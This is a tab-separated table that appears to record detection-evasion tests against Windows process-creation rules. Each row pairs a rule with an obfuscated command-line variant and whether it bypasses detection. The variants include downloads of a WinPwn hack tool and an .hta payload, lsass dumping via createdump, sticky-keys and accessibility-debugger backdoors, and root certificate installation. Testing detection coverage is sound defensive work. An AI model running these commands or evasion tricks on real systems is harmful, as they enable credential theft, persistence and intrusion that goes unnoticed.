Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
tactics_execution	proc_creation_win_curl_download_direct_ip_susp_extensions	Suspicious File Download From IP Via Curl.EXE	5cb299fc-5fb1-4d07-b989-0644c68b6043		"curl  --output benign.hta ""https://12.34.56.78/hack/evil.hta """	TRUE	TRUE	FALSE	File Download From IP URL Via Curl.EXE (9cc85849-3b02-4cb5-b371-3a1ff54f2218); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
tactics_execution	proc_creation_win_curl_download_susp_file_sharing_domains	Suspicious File Download From File Sharing Domain Via Curl.EXE	56454143-524f-49fb-b1c6-3fb8b1ad41fb		"curl  -o WinPwn.ps1 ""https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1"""	TRUE	TRUE	FALSE	HackTool - WinPwn Execution (d557dc06-62e8-4468-a8e8-7984124908ce); HackTool - WinPwn Execution (d557dc06-62e8-4468-a8e8-7984124908ce); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
tactics_execution	proc_creation_win_curl_download_susp_file_sharing_domains	Suspicious File Download From File Sharing Domain Via Curl.EXE	56454143-524f-49fb-b1c6-3fb8b1ad41fb		"curl  -O ""https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1 """	TRUE	TRUE	FALSE	HackTool - WinPwn Execution (d557dc06-62e8-4468-a8e8-7984124908ce); HackTool - WinPwn Execution (d557dc06-62e8-4468-a8e8-7984124908ce); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
tactics_execution	proc_creation_win_curl_download_susp_file_sharing_domains	Suspicious File Download From File Sharing Domain Via Curl.EXE	56454143-524f-49fb-b1c6-3fb8b1ad41fb		"curl  ""-O"" ""https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1"""	TRUE	TRUE	FALSE	HackTool - WinPwn Execution (d557dc06-62e8-4468-a8e8-7984124908ce); HackTool - WinPwn Execution (d557dc06-62e8-4468-a8e8-7984124908ce); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
tactics_execution	proc_creation_win_curl_insecure_connection	Insecure Transfer Via Curl.EXE	cb9cc1d1-e84e-4bdc-b7ad-c31b1b7908ec	"curl  \""--insecure\"" http://example.com"	"curl ""--insecure"" http://example.com"	TRUE	FALSE	FALSE	Insecure Transfer Via Curl.EXE (cb9cc1d1-e84e-4bdc-b7ad-c31b1b7908ec); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
tactics_execution	proc_creation_win_curl_insecure_connection	Insecure Transfer Via Curl.EXE	cb9cc1d1-e84e-4bdc-b7ad-c31b1b7908ec	curl  -k  http://example.com	cmd.exe /c curl -k^  http://example.com	TRUE	FALSE	FALSE	Insecure Transfer Via Curl.EXE (cb9cc1d1-e84e-4bdc-b7ad-c31b1b7908ec); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
tactics_execution	proc_creation_win_curl_insecure_connection	Insecure Transfer Via Curl.EXE	cb9cc1d1-e84e-4bdc-b7ad-c31b1b7908ec		"powershell.exe -Command ""[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; Invoke-WebRequest -Uri 'http://example.com'"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
tactics_execution	proc_creation_win_curl_local_file_read	Local File Read Using Curl.EXE	aa6f6ea6-0676-40dd-b510-6e46f02d8867		"curl ""file:/""//C:\Users\xodih\AppData\Local\Temp\calc.dll"	TRUE	TRUE	FALSE	Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
tactics_execution	proc_creation_win_curl_local_file_read	Local File Read Using Curl.EXE	aa6f6ea6-0676-40dd-b510-6e46f02d8867		curl file://localhost/C:\Users\xodih\AppData\Local\Temp\calc.dll	TRUE	TRUE	FALSE	Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
tactics_execution	proc_creation_win_curl_local_file_read	Local File Read Using Curl.EXE	aa6f6ea6-0676-40dd-b510-6e46f02d8867		curl file://C:\Users\xodih\AppData\Local\Temp\calc.dll	TRUE	TRUE	FALSE	Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		"chrome.exe ""--remote-debugging-port=9222"""	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		cmd.exe /c chrome.exe --remote-debugging^--port=9222	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		cmd.exe /c firefox.exe -start-debugger-server^ 6000	FALSE	FALSE	FALSE	
t1553.004	proc_creation_win_certutil_certificate_installation	New Root Certificate Installed Via Certutil.EXE	d2125259-ddea-4c1c-9c22-977eb5b29cf0	"certutil.exe  \""-addstore\"" root C:\Users\Public\cert.cer"	"certutil.exe ""-addstore"" root C:\Users\Public\cert.cer"	TRUE	FALSE	FALSE	New Root Certificate Installed Via Certutil.EXE (d2125259-ddea-4c1c-9c22-977eb5b29cf0)
t1553.004	proc_creation_win_certutil_certificate_installation	New Root Certificate Installed Via Certutil.EXE	d2125259-ddea-4c1c-9c22-977eb5b29cf0	certutil.exe  -addstore root C:\Users\Public\cert.cer	cmd.exe /c certutil.exe -add^store root C:\Users\Public\cert.cer	TRUE	FALSE	FALSE	New Root Certificate Installed Via Certutil.EXE (d2125259-ddea-4c1c-9c22-977eb5b29cf0)
t1553.004	proc_creation_win_certutil_certificate_installation	New Root Certificate Installed Via Certutil.EXE	d2125259-ddea-4c1c-9c22-977eb5b29cf0		"powershell.exe -Command ""Import-Certificate -FilePath 'C:\Users\Public\cert.cer' -CertStoreLocation 'Cert:\LocalMachine\Root'"""	TRUE	TRUE	FALSE	Root Certificate Installed From Susp Locations (5f6a601c-2ecb-498b-9c33-660362323afa); Root Certificate Installed From Susp Locations (5f6a601c-2ecb-498b-9c33-660362323afa); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1614.001	proc_creation_win_chcp_codepage_lookup	Console CodePage Lookup Via CHCP	7090adee-82e2-4269-bd59-80691e7c6338		cmd.exe /c chcp .	TRUE	TRUE	TRUE	
t1614.001	proc_creation_win_chcp_codepage_lookup	Console CodePage Lookup Via CHCP	7090adee-82e2-4269-bd59-80691e7c6338		"powershell.exe -Command ""[Console]::OutputEncoding"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1614.001	proc_creation_win_chcp_codepage_lookup	Console CodePage Lookup Via CHCP	7090adee-82e2-4269-bd59-80691e7c6338		"cmd.exe /c ""C:\Windows\System32\chcp.com """	FALSE	FALSE	FALSE	
t1036	proc_creation_win_chcp_codepage_switch	Suspicious CodePage Switch Via CHCP	c7942406-33dd-4377-a564-0f62db0593a3		"chcp ""936"""	TRUE	TRUE	TRUE	
t1036	proc_creation_win_chcp_codepage_switch	Suspicious CodePage Switch Via CHCP	c7942406-33dd-4377-a564-0f62db0593a3	chcp  936	chcp 936	TRUE	FALSE	FALSE	Suspicious CodePage Switch Via CHCP (c7942406-33dd-4377-a564-0f62db0593a3)
t1036	proc_creation_win_chcp_codepage_switch	Suspicious CodePage Switch Via CHCP	c7942406-33dd-4377-a564-0f62db0593a3		cmd.exe /c chcp 0936	TRUE	TRUE	TRUE	
t1036	proc_creation_win_createdump_lolbin_execution	CreateDump Process Dump	515c8be5-e5df-4c5e-8f6d-a4a2f05e4b48		"""C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.0.17\createdump.exe"" ""-u"" ""-f"" C:\Users\Public\dotnet-lsass.dmp 788"	FALSE	FALSE	FALSE	
t1036	proc_creation_win_createdump_lolbin_execution	CreateDump Process Dump	515c8be5-e5df-4c5e-8f6d-a4a2f05e4b48		"""C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.0.17\createdump.exe"" --full --name C:\Users\Public\dotnet-lsass.dmp  788"	FALSE	FALSE	FALSE	
t1036	proc_creation_win_createdump_lolbin_execution	CreateDump Process Dump	515c8be5-e5df-4c5e-8f6d-a4a2f05e4b48		"copy ""C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.0.17\createdump.exe"" ""C:\Windows\Temp\srv_task.exe"" && ""C:\Windows\Temp\srv_task.exe"" ""-u"" ""-f"" C:\Users\Public\dotnet-lsass.dump 788"	TRUE	TRUE	TRUE	
t1546.001	proc_creation_win_cmd_assoc_execution	Change Default File Association Via Assoc	3d3aa6cd-6272-44d6-8afc-7e88dfef7061		"cmd.exe /c ""as""""soc .hta=txtfile"""	FALSE	FALSE	FALSE	
t1546.001	proc_creation_win_cmd_assoc_execution	Change Default File Association Via Assoc	3d3aa6cd-6272-44d6-8afc-7e88dfef7061		"powershell.exe -Command ""New-Item -Path 'HKLM:\SOFTWARE\Classes\.hta' -Value 'txtfile' -Force"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1546.001	proc_creation_win_cmd_assoc_execution	Change Default File Association Via Assoc	3d3aa6cd-6272-44d6-8afc-7e88dfef7061		"cmd.exe /c ""set ASSOC_CMD=assoc&& call %ASSOC_CMD% .hta=txtfile"""	FALSE	FALSE	FALSE	
t1546.008	proc_creation_win_cmd_mklink_osk_cmd	Potential Privilege Escalation Using Symlink Between Osk and Cmd	e9b61244-893f-427c-b287-3e708f321c6b		"cmd /c ""m""""klink C:\Windows\System32\osk.exe C:\Windows\System32\cmd.exe"""	FALSE	FALSE	FALSE	
t1546.008	proc_creation_win_cmd_mklink_osk_cmd	Potential Privilege Escalation Using Symlink Between Osk and Cmd	e9b61244-893f-427c-b287-3e708f321c6b		"cmd /c mklink %windir%\System32\osk.exe %windir%\System32\cmd."""",""exe"	FALSE	FALSE	FALSE	
t1546.008	proc_creation_win_cmd_mklink_osk_cmd	Potential Privilege Escalation Using Symlink Between Osk and Cmd	e9b61244-893f-427c-b287-3e708f321c6b		cmd /c mklink C:\Windows\System32\osk.exe C:\Windows\System32\cmd	TRUE	TRUE	TRUE	
t1546.008	proc_creation_win_cmd_mklink_osk_cmd	Potential Privilege Escalation Using Symlink Between Osk and Cmd	e9b61244-893f-427c-b287-3e708f321c6b	"cmd.exe /c ""cmd /c mklink C:\Windows\System32\.\osk.exe C:\Windows\System32\..\System32\cmd.exe"""	cmd /c mklink C:\Windows\System32\.\osk.exe C:\Windows\System32\..\System32\cmd.exe	TRUE	FALSE	FALSE	Potential Privilege Escalation Using Symlink Between Osk and Cmd (e9b61244-893f-427c-b287-3e708f321c6b); Potential Privilege Escalation Using Symlink Between Osk and Cmd (e9b61244-893f-427c-b287-3e708f321c6b); Potential Command Line Path Traversal Evasion Attempt (1327381e-6ab0-4f38-b583-4c1b8346a56b); Potential Command Line Path Traversal Evasion Attempt (1327381e-6ab0-4f38-b583-4c1b8346a56b)
t1546.008	proc_creation_win_cmd_sticky_keys_replace	Persistence Via Sticky Key Backdoor	1070db9a-3e5d-412e-8e7b-7183b616e1b3		"""cmd.exe"" /c copy ""/y"" C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe"	FALSE	FALSE	FALSE	
t1546.008	proc_creation_win_cmd_sticky_keys_replace	Persistence Via Sticky Key Backdoor	1070db9a-3e5d-412e-8e7b-7183b616e1b3		"""cmd.exe"" /c copy /Y ""C:\Windows\System32\cmd.exe"" ""C:\Windows\System32\sethc.exe"""	FALSE	FALSE	FALSE	
t1546.008	proc_creation_win_cmd_sticky_keys_replace	Persistence Via Sticky Key Backdoor	1070db9a-3e5d-412e-8e7b-7183b616e1b3		"""cmd.exe"" /c c^opy /y %SystemRoot%\System32\cmd.exe %SystemRoot%\System32\sethc.exe"	FALSE	FALSE	FALSE	
t1546.008	proc_creation_win_registry_install_reg_debugger_backdoor	Suspicious Debugger Registration Cmdline	ae215552-081e-44c7-805f-be16f975c8a2		"""powershell.exe"" & {$input_table = ""osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe"".split("","")
$Name = ""Debugger""
$Value = ""C:\windows\system32\cmd.exe""
Foreach ($item in $input_table){
  $item = $item.trim()
  $registryPath = ""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item""
  IF(!(Test-Path $registryPath))
  {
    New-Item -Path $registryPath -Force
    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
  }
  ELSE
  {
    New-ItemProperty -Path $registryPath -Name $name -Value $Value
  }
}}"	FALSE	FALSE	FALSE	
